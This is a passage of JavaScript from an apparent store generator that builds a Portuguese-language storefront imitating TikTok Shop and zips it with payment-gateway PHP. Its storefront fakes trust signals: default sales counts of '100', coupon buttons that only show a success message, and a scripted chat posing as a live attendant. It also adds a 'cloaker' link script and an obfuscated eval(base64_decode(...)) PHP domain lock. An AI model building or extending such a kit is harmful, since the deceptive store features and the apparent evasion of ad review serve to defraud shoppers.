        .size-item.selected { border-color: #fe2c55; color: #fe2c55; background: #fff5f5; }
        .modal-footer { margin-top: auto; padding-top: 16px; }
        .btn-confirm-add { width: 100%; background: #fe2c55; color: white; padding: 14px; border-radius: 8px; font-weight: 600; font-size: 16px; border: none; cursor: pointer; transition: opacity 0.2s; }
        .btn-confirm-add:disabled { opacity: 0.5; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="fixed-header-group">
        <div class="top-bar">
            <div class="btn-back" onclick="window.history.back()">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
            </div>
            <div class="search-box">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
                <input type="text" class="search-input" placeholder="Pesquisar" id="search-input">
            </div>
            <div class="top-icons">
                <div class="icon-btn">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                </div>
                <div class="icon-btn" onclick="window.location.href='carrinho.html'">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M9 22a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"/><path d="M20 22a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg>
                    <span class="cart-badge" id="cart-badge">0</span>
                </div>
            </div>
        </div>
        <div class="store-header">
            <img src="{{STORE_LOGO}}" alt="Logo" class="store-logo" id="store-logo">
            <div class="store-info-text">
                <div class="store-name" id="store-name">{{STORE_NAME}}</div>
                <div class="store-sales">{{STORE_SALES}} vendido(s)</div>
            </div>
            <div class="store-actions">
                <button class="btn-follow" id="btn-follow" onclick="toggleFollow()">Seguir</button>
                <button class="btn-msg" onclick="openChat()">Mensagem</button>
            </div>
        </div>
        <div class="coupons-bar">
            <div class="coupon-card">
                <div class="coupon-info">
                    <div class="coupon-title">FRETE GRÁTIS</div>
                    <div class="coupon-sub">{{COUPON_SUB}}</div>
                </div>
                <button class="coupon-btn" onclick="resgatarCupom(this, '{{COUPON_TITLE}}')">Resgatar</button>
            </div>
            <div class="coupon-card highlight">
                <div class="coupon-info">
                    <div class="coupon-title"></div>
                    <div class="coupon-sub">{{DISCOUNT_SUB}}</div>
                </div>
                <button class="coupon-btn outline" onclick="resgatarCupom(this, '{{DISCOUNT_TITLE}}')">Resgatar</button>
            </div>
        </div>
        <div class="nav-tabs">
            <div class="nav-item active" data-tab="home">Pagina inicial</div>
            <div class="nav-item" data-tab="products">Produtos</div>
            <div class="nav-item" data-tab="categories">Categorias</div>
        </div>
    </div>

    <!-- Aba Pagina Inicial -->
    <div class="tab-content active" id="tab-home">
        <div class="section-title">
            Principais produtos
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
        </div>
        <div class="top-products-scroll" id="top-products"></div>
        <div class="recommend-section">
            <div class="section-title">Recomendado para voce</div>
            <div class="recommend-grid" id="recommend-grid"></div>
        </div>
    </div>

    <!-- Aba Produtos -->
    <div class="tab-content" id="tab-products">
        <div class="filters-bar">
            <div class="filter-opt active" data-filter="recommended">Recomendado</div>
            <div class="filter-separator"></div>
            <div class="filter-opt" data-filter="bestsellers">Mais vendidos</div>
            <div class="filter-separator"></div>
            <div class="filter-opt" data-filter="newest">Lancamentos</div>
            <div class="filter-icon-container">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
            </div>
        </div>
        <div class="products-list" id="products-container"></div>
    </div>

    <!-- Aba Categorias -->
    <div class="tab-content" id="tab-categories">
        <div class="categories-list" id="categories-container"></div>
    </div>

    <!-- Toast Cupom -->
    <div id="coupon-toast" class="coupon-toast">Cupom resgatado com sucesso!</div>

    <!-- Tela de Chat -->
    <div id="chat-screen" class="chat-screen">
        <div class="chat-header">
            <div class="btn-back-chat" onclick="closeChat()">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
            </div>
            <span class="chat-title">Chat</span>
            <div class="cart-icon" onclick="window.location.href='carrinho.html'">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M9 22a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"/><path d="M20 22a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg>
            </div>
        </div>
        <div class="chat-messages" id="chat-messages">
            <!-- Avatar + nome da loja no topo -->
            <div class="msg-store" style="margin-bottom:4px;">
                <img src="{{STORE_LOGO}}" alt="Loja" class="avatar">
                <div>
                    <div style="font-size:12px;font-weight:600;color:#161823;margin-bottom:4px;">{{STORE_NAME}}</div>
                    <div class="bubble" style="color:#43a047;font-size:12px;padding:5px 12px;">Online</div>
                </div>
            </div>
            <!-- Perguntas sugeridas -->
            <div class="chat-suggestions" id="chat-suggestions">
                <button class="suggestion-pill" onclick="askQuestion('Como faco meu pedido?')">Como faco meu pedido?</button>
                <button class="suggestion-pill" onclick="askQuestion('Qual o prazo de entrega?')">Qual o prazo de entrega?</button>
                <button class="suggestion-pill" onclick="askQuestion('Como funciona a troca/devolucao?')">Como funciona a troca/devolucao?</button>
                <button class="suggestion-pill" onclick="askQuestion('Quais formas de pagamento?')">Quais formas de pagamento?</button>
                <button class="suggestion-pill" onclick="askQuestion('Como rastrear meu pedido?')">Como rastrear meu pedido?</button>
                <button class="suggestion-pill" onclick="askQuestion('Como entrar na minha conta?')">Como entrar na minha conta?</button>
                <button class="suggestion-pill" onclick="askQuestion('Falar com atendente')">Falar com atendente</button>
            </div>
        </div>
        <div class="chat-input-bar">
            <input type="text" class="chat-input" id="chat-input" placeholder="Digite uma mensagem..." oninput="updateSendBtn()" onkeydown="if(event.key==='Enter')sendChatMsg()">
            <button class="chat-send-btn" id="chat-send-btn" onclick="sendChatMsg()">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
            </button>
        </div>
    </div>

    <!-- Modal de Variacao -->
    <div id="variation-modal" class="modal-overlay">
        <div class="modal-content">
            <button class="modal-close" onclick="closeModal()">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
            </button>
            <div class="modal-header">
                <img src="" class="modal-img" id="mod-img">
                <div class="modal-price-area">
                    <div class="modal-price-val" id="mod-price">R$ 0,00</div>
                    <div style="font-size:13px; color:#888; margin-top:6px;" id="mod-selection">Selecione as opcoes</div>
                </div>
            </div>
            <div id="mod-options-container"></div>
            <div class="modal-footer">
                <button class="btn-confirm-add" id="btn-confirm-add" disabled onclick="confirmAddToCart()">Confirmar</button>
            </div>
        </div>
    </div>

    <script>
        const STORAGE_KEY = 'tktk_cart_items';
        const PRODUCTS_KEY = 'tktk_all_products';
        const CATEGORIES_DATA = {{CATEGORIES_JSON}};
        let allProducts = {};
        let currentModalProductId = null;
        let selectedColor = null;
        let selectedSize = null;
        let currentFilter = 'recommended';

        function init() {
            const productsData = localStorage.getItem(PRODUCTS_KEY);
            if (productsData) {
                allProducts = JSON.parse(productsData);
            }
            setupTabs();
            setupFilters();
            setupSearch();
            renderTopProducts();
            renderRecommendGrid();
            renderProductsList();
            renderCategories();
            updateCartBadge();
        }

        function setupTabs() {
            document.querySelectorAll('.nav-item').forEach(tab => {
                tab.addEventListener('click', () => {
                    document.querySelectorAll('.nav-item').forEach(t => t.classList.remove('active'));
                    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                    tab.classList.add('active');
                    const tabId = 'tab-' + tab.dataset.tab;
                    document.getElementById(tabId).classList.add('active');
                });
            });
        }

        function setupFilters() {
            document.querySelectorAll('.filter-opt').forEach(opt => {
                opt.addEventListener('click', () => {
                    document.querySelectorAll('.filter-opt').forEach(o => o.classList.remove('active'));
                    opt.classList.add('active');
                    currentFilter = opt.dataset.filter;
                    renderProductsList();
                });
            });
        }

        function setupSearch() {
            document.getElementById('search-input').addEventListener('input', (e) => {
                const term = e.target.value.toLowerCase();
                renderProductsList(term);
                renderRecommendGrid(term);
            });
        }

        function getProductsArray() {
            return Object.entries(allProducts).map(([id, p]) => ({id, ...p}));
        }

        function sortProducts(products, filter) {
            const arr = [...products];
            if (filter === 'bestsellers') {
                arr.sort((a, b) => (parseInt(b.salesCount) || 0) - (parseInt(a.salesCount) || 0));
            } else if (filter === 'newest') {
                arr.reverse();
            }
            return arr;
        }

        function calcDiscount(current, original) {
            if (!original || !current) return 0;
            const c = parseFloat(current.replace(/[^0-9,]/g, '').replace(',', '.'));
            const o = parseFloat(original.replace(/[^0-9,]/g, '').replace(',', '.'));
            if (o <= 0 || c >= o) return 0;
            return Math.round(((o - c) / o) * 100);
        }

        function renderTopProducts() {
            const container = document.getElementById('top-products');
            const products = getProductsArray().slice(0, 6);
            if (products.length === 0) {
                container.innerHTML = '<div class="empty-state">Nenhum produto</div>';
                return;
            }
            container.innerHTML = products.map((p, i) => {
                const discount = calcDiscount(p.currentPrice, p.originalPrice);
                const rankClass = i < 3 ? 'r' + (i + 1) : '';
                return \`
                <div class="top-prod-card" onclick="goToProduct('\${p.id}')">
                    \${i < 3 ? \`<div class="rank-badge \${rankClass}">\${i + 1}</div>\` : ''}
                    <img src="\${p.mainImage}" class="prod-img" alt="">
                    <div class="prod-info">
                        <div class="prod-title">\${p.productTitle || ''}</div>
                        <div class="price-row">
                            <span class="price-current">R$ \${p.currentPrice || '0,00'}</span>
                            \${p.originalPrice ? \`<span class="price-original">R$ \${p.originalPrice}</span>\` : ''}
                        </div>
                        <div class="badges">
                            \${discount > 0 ? \`<span class="badge-off">\${discount}% OFF</span>\` : ''}
                            <span class="badge-free">Frete gratis</span>
                        </div>
                        <div class="sales-count">\${p.salesCount || '100'} vendido(s)</div>
                    </div>
                </div>\`;
            }).join('');
        }

        function renderRecommendGrid(filter = '') {
            const container = document.getElementById('recommend-grid');
            let products = getProductsArray();
            if (filter) {
                products = products.filter(p => (p.productTitle || '').toLowerCase().includes(filter));
            }
            if (products.length === 0) {
                container.innerHTML = '<div class="empty-state" style="grid-column: 1/-1;">Nenhum produto encontrado</div>';
                return;
            }
            container.innerHTML = products.map(p => {
                const discount = calcDiscount(p.currentPrice, p.originalPrice);
                return \`
                <div class="grid-prod-card">
                    <img src="\${p.mainImage}" class="prod-img" onclick="goToProduct('\${p.id}')" alt="">
                    <div class="prod-info">
                        <div class="prod-title" onclick="goToProduct('\${p.id}')">\${p.productTitle || ''}</div>
                        <div class="price-row">
                            <span class="price-current">R$ \${p.currentPrice || '0,00'}</span>
                            \${p.originalPrice ? \`<span class="price-original">R$ \${p.originalPrice}</span>\` : ''}
                        </div>
                        <div class="badges">
                            \${discount > 0 ? \`<span class="badge-off">\${discount}% OFF</span>\` : ''}
                            <span class="badge-free">Frete gratis</span>
                        </div>
                        <div class="sales-count">\${p.salesCount || '100'} vendido(s)</div>
                    </div>
                </div>\`;
            }).join('');
        }

        function renderProductsList(filter = '') {
            const container = document.getElementById('products-container');
            let products = getProductsArray();
            if (filter) {
                products = products.filter(p => (p.productTitle || '').toLowerCase().includes(filter));
            }
            products = sortProducts(products, currentFilter);
            if (products.length === 0) {
                container.innerHTML = '<div class="empty-state">Nenhum produto encontrado</div>';
                return;
            }
            container.innerHTML = products.map(p => {
                const discount = calcDiscount(p.currentPrice, p.originalPrice);
                return \`
                <div class="product-card">
                    <div class="prod-img-box" onclick="goToProduct('\${p.id}')">
                        <img src="\${p.mainImage}" class="prod-img" alt="">
                    </div>
                    <div class="prod-info">
                        <div class="prod-title" onclick="goToProduct('\${p.id}')">\${p.productTitle || ''}</div>
                        <div class="prod-badges">
                            \${discount > 0 ? \`<div class="badge-off">\${discount}% OFF</div>\` : ''}
                            <div class="badge-free">Frete gratis</div>
                        </div>
                        <div class="prod-meta">\${p.salesCount || '100'} vendido(s)</div>
                        <div class="price-box">
                            <div class="price-current">R$ \${p.currentPrice || '0,00'}</div>
                            \${p.originalPrice ? \`<div class="price-original">R$ \${p.originalPrice}</div>\` : ''}
                        </div>
                    </div>
                    <div class="card-actions">
                        <button class="btn-mini-cart" onclick="openOptionsModal('\${p.id}')">
                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 22a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"/><path d="M20 22a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg>
                        </button>
                        <button class="btn-buy-card" onclick="goToProduct('\${p.id}')">Comprar</button>
                    </div>
                </div>\`;
            }).join('');
        }

        function renderCategories() {
            const container = document.getElementById('categories-container');
            if (!CATEGORIES_DATA || CATEGORIES_DATA.length === 0) {
                const products = getProductsArray();
                const autoCategories = {};
                products.forEach(p => {
                    const cat = p.category || 'Geral';
                    if (!autoCategories[cat]) {
                        autoCategories[cat] = { name: cat, count: 0, image: p.mainImage };
                    }
                    autoCategories[cat].count++;
                });
                const cats = Object.values(autoCategories);
                if (cats.length === 0) {
                    container.innerHTML = '<div class="empty-state">Nenhuma categoria</div>';
                    return;
                }
                container.innerHTML = cats.map(c => \`
                    <div class="category-item" onclick="filterByCategory('\${c.name}')">
                        <img src="\${c.image}" class="category-img" alt="">
                        <div class="category-info">
                            <div class="category-name">\${c.name}</div>
                            <div class="category-count">\${c.count} produto(s)</div>
                        </div>
                        <svg class="category-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
                    </div>\`).join('');
                return;
            }
            container.innerHTML = CATEGORIES_DATA.map(c => \`
                <div class="category-item" onclick="filterByCategory('\${c.name}')">
                    <img src="\${c.image || 'https://placehold.co/50x50?text=Cat'}" class="category-img" alt="">
                    <div class="category-info">
                        <div class="category-name">\${c.name}</div>
                        <div class="category-count">\${c.count || 1} produto(s)</div>
                    </div>
                    <svg class="category-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
                </div>\`).join('');
        }

        function filterByCategory(cat) {
            document.querySelectorAll('.nav-item').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.querySelector('.nav-item[data-tab="products"]').classList.add('active');
            document.getElementById('tab-products').classList.add('active');
            document.getElementById('search-input').value = cat;
            renderProductsList(cat.toLowerCase());
        }

        function openOptionsModal(id) {
            const p = allProducts[id];
            if (!p) return;
            const hasColors = p.colors && p.colors.length > 0;
            const hasSizes = p.sizes && p.sizes.length > 0;
            if (!hasColors && !hasSizes) {
                addToCartDirect(id, p.productTitle, p.currentPrice, p.mainImage);
                return;
            }
            currentModalProductId = id;
            selectedColor = hasColors ? null : '__none__';
            selectedSize = hasSizes ? null : '__none__';
            document.getElementById('mod-img').src = p.mainImage;
            document.getElementById('mod-price').innerText = 'R$ ' + p.currentPrice;
            const container = document.getElementById('mod-options-container');
            container.innerHTML = '';
            if (hasColors) {
                let html = '<div class="opt-group"><div class="opt-title">Cor</div><div class="color-list">';
                p.colors.forEach(c => {
                    const imgUrl = c.imageUrl || 'https://placehold.co/72x72?text=.';
                    html += \`<div class="color-item" onclick="selectColor('\${c.name}', '\${c.imageUrl}', '\${c.price}')" data-val="\${c.name}"><img src="\${imgUrl}"><span>\${c.name}</span></div>\`;
                });
                html += '</div></div>';
                container.innerHTML += html;
            }
            if (hasSizes) {
                let html = '<div class="opt-group"><div class="opt-title">Tamanho</div><div class="size-list">';
                p.sizes.forEach(s => {
                    const cleanS = s.trim();
                    html += \`<div class="size-item" onclick="selectSize('\${cleanS}')" data-val="\${cleanS}">\${cleanS}</div>\`;
                });
                html += '</div></div>';
                container.innerHTML += html;
            }
            updateModalButton();
            document.getElementById('variation-modal').classList.add('active');
        }

        function closeModal() {
            document.getElementById('variation-modal').classList.remove('active');
        }

        function selectColor(name, img, price) {
            selectedColor = name;
            document.querySelectorAll('.color-item').forEach(el => el.classList.remove('selected'));
            const clicked = document.querySelector(\`.color-item[data-val="\${name}"]\`);
            if (clicked) clicked.classList.add('selected');
            if (img && img !== 'undefined' && img !== '') document.getElementById('mod-img').src = img;
            if (price && price !== 'undefined' && price !== '') document.getElementById('mod-price').innerText = 'R$ ' + price;
            updateModalButton();
        }

        function selectSize(name) {
            selectedSize = name;
            document.querySelectorAll('.size-item').forEach(el => el.classList.remove('selected'));
            const clicked = Array.from(document.querySelectorAll('.size-item')).find(el => el.getAttribute('data-val') === name);
            if (clicked) clicked.classList.add('selected');
            updateModalButton();
        }

        function updateModalButton() {
            const btn = document.getElementById('btn-confirm-add');
            const txt = document.getElementById('mod-selection');
            if (selectedColor && selectedSize) {
                btn.disabled = false;
                let desc = '';
                if (selectedColor !== '__none__') desc += selectedColor;
                if (selectedSize !== '__none__') desc += (desc ? ', ' : '') + selectedSize;
                txt.innerText = desc || 'Padrao';
            } else {
                btn.disabled = true;
                txt.innerText = 'Selecione as opcoes';
            }
        }

        function confirmAddToCart() {
            const p = allProducts[currentModalProductId];
            const currentImg = document.getElementById('mod-img').src;
            const currentPriceText = document.getElementById('mod-price').innerText.replace('R$ ', '');
            const colorVal = selectedColor === '__none__' ? '' : selectedColor;
            const sizeVal = selectedSize === '__none__' ? '' : selectedSize;
            addToCartDirect(currentModalProductId, p.productTitle, currentPriceText, currentImg, colorVal, sizeVal);
            closeModal();
        }

        function addToCartDirect(id, title, price, image, color = '', size = '') {
            const cart = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
            const exists = cart.find(i => i.productId === id && i.color === color && i.size === size);
            if (exists) {
                exists.qty++;
            } else {
                cart.push({ productId: id, title: title, price: price, image: image, qty: 1, selected: true, color: color, size: size });
            }
            localStorage.setItem(STORAGE_KEY, JSON.stringify(cart));
            updateCartBadge();
            const badge = document.getElementById('cart-badge');
            badge.style.transform = 'scale(1.4)';
            setTimeout(() => badge.style.transform = 'scale(1)', 200);
        }

        function goToProduct(id) {
            window.location.href = 'index.php?product=' + encodeURIComponent(id);
        }

        function updateCartBadge() {
            const cart = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
            document.getElementById('cart-badge').textContent = cart.length;
        }

        document.addEventListener('DOMContentLoaded', init);

        // --- SEGUIR ---
        let isFollowing = false;
        function toggleFollow() {
            isFollowing = !isFollowing;
            const btn = document.getElementById('btn-follow');
            if (isFollowing) {
                btn.textContent = 'Seguindo';
                btn.classList.add('following');
            } else {
                btn.textContent = 'Seguir';
                btn.classList.remove('following');
            }
        }

        // --- RESGATAR CUPOM ---
        function resgatarCupom(btn, title) {
            btn.textContent = 'Resgatado';
            btn.style.background = '#e0e0e0';
            btn.style.color = '#888';
            btn.style.borderColor = '#e0e0e0';
            btn.disabled = true;
            showToast('Cupom "' + title + '" resgatado!');
        }
        function showToast(msg) {
            const toast = document.getElementById('coupon-toast');
            toast.textContent = msg;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2800);
        }

        // --- CHAT ---
        const chatAnswers = {
            'Como faco meu pedido?': 'Para fazer seu pedido, basta escolher o produto desejado, selecionar as opcoes (tamanho, cor) e clicar em "Comprar". Depois preencha seus dados e finalize o pagamento via Pix ou cartao.',
            'Qual o prazo de entrega?': 'O prazo de entrega estimado e de 7 a 15 dias uteis apos a confirmacao do pagamento. O rastreamento fica disponivel em ate 3 dias uteis.',
            'Como funciona a troca/devolucao?': 'Voce tem ate 30 dias para solicitar troca ou devolucao. Basta entrar em contato conosco pelo chat informando o numero do pedido e o motivo.',
            'Quais formas de pagamento?': 'Aceitamos Pix (aprovacao imediata com desconto) e cartao de credito em ate 12 parcelas.',
            'Como rastrear meu pedido?': 'Apos o envio, voce recebera o codigo de rastreamento por e-mail. Voce pode acompanhar pelo site dos Correios ou da transportadora indicada.',
            'Como entrar na minha conta?': 'Acesse o icone de perfil no canto superior direito da loja para entrar na sua conta ou criar um cadastro.',
            'Falar com atendente': 'Olá! Estou aqui para ajudar. Pode me contar o que precisa? Respondemos em instantes!'
        };

        function openChat() {
            document.getElementById('chat-screen').classList.add('open');
            document.body.style.overflow = 'hidden';
        }
        function closeChat() {
            document.getElementById('chat-screen').classList.remove('open');
            document.body.style.overflow = '';
        }

        function askQuestion(question) {
            // Esconde as sugestoes
            const suggestions = document.getElementById('chat-suggestions');
            if (suggestions) suggestions.style.display = 'none';
            // Adiciona mensagem do usuario
            addUserMsg(question);
            // Mostra indicador de digitando e depois resposta
            showTyping(question);
        }

        function addUserMsg(text) {
            const msgs = document.getElementById('chat-messages');
            const div = document.createElement('div');
            div.className = 'msg-user';
            div.textContent = text;
            msgs.appendChild(div);
            msgs.scrollTop = msgs.scrollHeight;
        }

        function showTyping(question) {
            const msgs = document.getElementById('chat-messages');
            const typing = document.createElement('div');
            typing.className = 'typing-indicator';
            typing.id = 'typing-indicator';
            typing.innerHTML = '<img src="{{STORE_LOGO}}" class="avatar" style="width:28px;height:28px;border-radius:50%;object-fit:cover;"><div class="bubble"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>';
            msgs.appendChild(typing);
            msgs.scrollTop = msgs.scrollHeight;
            setTimeout(() => {
                const t = document.getElementById('typing-indicator');
                if (t) t.remove();
                addStoreMsg(chatAnswers[question] || 'Obrigado pela mensagem! Em breve nosso atendente respondera.');
                showSuggestionsAgain();
            }, 1200 + Math.random() * 800);
        }

        function addStoreMsg(text) {
            const msgs = document.getElementById('chat-messages');
            const wrap = document.createElement('div');
            wrap.className = 'msg-store';
            wrap.innerHTML = '<img src="{{STORE_LOGO}}" class="avatar"><div class="bubble">' + text + '</div>';
            msgs.appendChild(wrap);
            msgs.scrollTop = msgs.scrollHeight;
        }

        function showSuggestionsAgain() {
            const msgs = document.getElementById('chat-messages');
            const newSug = document.createElement('div');
            newSug.className = 'chat-suggestions';
            newSug.innerHTML = \`
                <button class="suggestion-pill" onclick="askQuestion('Como faco meu pedido?')">Como faco meu pedido?</button>
                <button class="suggestion-pill" onclick="askQuestion('Qual o prazo de entrega?')">Qual o prazo de entrega?</button>
                <button class="suggestion-pill" onclick="askQuestion('Como funciona a troca/devolucao?')">Como funciona a troca/devolucao?</button>
                <button class="suggestion-pill" onclick="askQuestion('Quais formas de pagamento?')">Quais formas de pagamento?</button>
                <button class="suggestion-pill" onclick="askQuestion('Como rastrear meu pedido?')">Como rastrear meu pedido?</button>
                <button class="suggestion-pill" onclick="askQuestion('Falar com atendente')">Falar com atendente</button>
            \`;
            msgs.appendChild(newSug);
            msgs.scrollTop = msgs.scrollHeight;
        }

        function updateSendBtn() {
            const input = document.getElementById('chat-input');
            const btn = document.getElementById('chat-send-btn');
            if (input.value.trim().length > 0) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        function sendChatMsg() {
            const input = document.getElementById('chat-input');
            const text = input.value.trim();
            if (!text) return;
            input.value = '';
            updateSendBtn();
            const suggestions = document.querySelectorAll('.chat-suggestions:last-child');
            suggestions.forEach(s => s.style.display = 'none');
            addUserMsg(text);
            showTyping('Falar com atendente');
        }
    </script>
</body>
</html>`;
function getTikTokPixelScript(pixelId) {
    if (!pixelId || pixelId.trim() === "") return "";
    return `
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};

  ttq.load('${pixelId}');
  ttq.page();
}(window, document, 'ttq');
</script>
`;
}

// --- FUNÇÃO DE DOWNLOAD (CORRIGIDA E ESTÁVEL) ---
function updateGatewayFields() {
    const selector = document.getElementById('gateway-selector');
    const selected = selector.value;
    // Esconde todos
    document.querySelectorAll('.gateway-body').forEach(el => {
        el.style.display = 'none';
        el.classList.remove('active');
    });
    // Mostra o selecionado
    const target = document.getElementById('gw-fields-' + selected);
    if(target) {
        target.style.display = 'block';
        target.classList.add('active');
    }
}

// Atualize o início desta função
function downloadCompleteSite() {
    if (typeof JSZip === 'undefined') { alert("Erro: Biblioteca JSZip não carregada."); return; }
    const zip = new JSZip();
    const data = getEditorData(); 

    const checkoutStyle = document.getElementById('checkout-style-selector') ? document.getElementById('checkout-style-selector').value : 'v1';
    let checkoutTemplateToUse = (checkoutStyle === 'v2') ? CHECKOUT_V2_TEMPLATE : CHECKOUT_TEMPLATE;

    const selectedGateway = val("gateway-selector");
    let pubKey = '', secKey = '', token = '', company = '';

    // Lógica de captura sincronizada com os IDs do HTML
    if (selectedGateway === 'plumify') { 
        pubKey = val('plumify-token'); 
    } else if (selectedGateway === 'fastsoft') { 
        secKey = val('fastsoft-secret'); // PEGA A CHAVE SK_ QUE VOCÊ COLA
        pubKey = 'x'; // Necessário para o formato x:TOKEN da FastSoft
    // Localize onde as chaves são capturadas e adicione:
}else if (selectedGateway === 'payhub') {
    secKey = val('payhub-secret');
    pubKey = 'x'; // Prefixo literal exigido pela documentação
    } else if (selectedGateway === 'freepay') { 
        pubKey = val('freepay-secret'); 
        secKey = val('freepay-company'); 
    } else if (selectedGateway === 'kingpay') { 
        secKey = val('kingpay-secret'); 
    } else if (selectedGateway === 'invictus') { 
        token = val('invictus-token'); 
        pubKey = val('invictus-hash'); 
    } else if (selectedGateway === 'duttyfy') { 
        secKey = val('duttyfy-secret'); 
    } else if (selectedGateway === 'pagflex') { 
        pubKey = val('pagflex-secret'); 
        secKey = val('pagflex-company'); 
    } else if (selectedGateway === 'blackpayments') { 
        pubKey = val('black-public'); 
        secKey = val('black-secret'); 
    } else if (selectedGateway === 'bynet') { 
        pubKey = val('bynet-apikey'); 
    } else if (selectedGateway === 'otimize') { 
        secKey = val('otimize-secret'); 
    } else if (selectedGateway === 'ironpay') { 
        token = val('ironpay-token'); 
    } else if (selectedGateway === 'skalepay') { 
        secKey = val('skalepay-secret'); 
        pubKey = 'x'; // Prefixo literal exigido pela autenticação
    } else { 
        pubKey = val(selectedGateway + '-public'); 
        secKey = val(selectedGateway + '-secret'); 
    }

    let paymentPHP = GATEWAY_TEMPLATES[selectedGateway] || GATEWAY_TEMPLATES['default'];
    // Injeta a chave real no template antes de salvar no ZIP
    paymentPHP = paymentPHP.replace('{{KEY_PUBLIC}}', pubKey || '').replace('{{KEY_SECRET}}', secKey || '').replace('{{KEY_TOKEN}}', token || '').replace('{{KEY_COMPANY}}', company || '');
    
    // --- INTEGRAÇÃO COMMANDER / CLOAKER ---
    // Script injetado no rodapé das páginas para persistir os parâmetros da URL (UTMs, click_id)
    let commanderScript = "";
    if (data.useCloakerIntegration) {
        commanderScript = `<script>
        (function() {
            var params = window.location.search;
            if (params) {
                document.querySelectorAll('a').forEach(function(link) {
                    var currentUrl = link.getAttribute('href');
                    if (currentUrl && currentUrl.indexOf('#') !== 0 && currentUrl.indexOf('javascript') === -1) {
                        var separator = currentUrl.indexOf('?') === -1 ? '?' : '&';
                        link.setAttribute('href', currentUrl + separator + params.substring(1));
                    }
                });
            }
        })();
        </script>`;
    }

// --- SEGURANÇA (DOMÍNIO) ---
    let phpSecurityHeader = "";
    if (data.securityDomain && data.securityDomain.trim() !== "") {
        const domain = data.securityDomain.trim().replace(/https?:\/\//, '').replace('www.', '').split('/')[0];
        const targetRedirect = data.securityDomain.includes('http') ? data.securityDomain : 'https://' + domain;
        // Cria um cabeçalho PHP ofuscado para verificar o domínio
        const rawPhpCode = `$auth_host='${domain}';$current_host=$_SERVER['HTTP_HOST'];if(strpos($current_host,$auth_host)===false&&$current_host!=='localhost'&&$current_host!=='127.0.0.1'){header("Location: ${targetRedirect}");exit();}`;
        const encodedPhp = btoa(rawPhpCode);
        phpSecurityHeader = `<?php eval(base64_decode('${encodedPhp}')); ?>\n`;
    }

    // --- SEGURANÇA (LICENÇA/VALIDADE) ---
    // Obtém data de expiração e WhatsApp do PHP (se disponível via sessão)
    const licenseExpiry = window.LICENSE_EXPIRY_DATE || '2099-12-31';
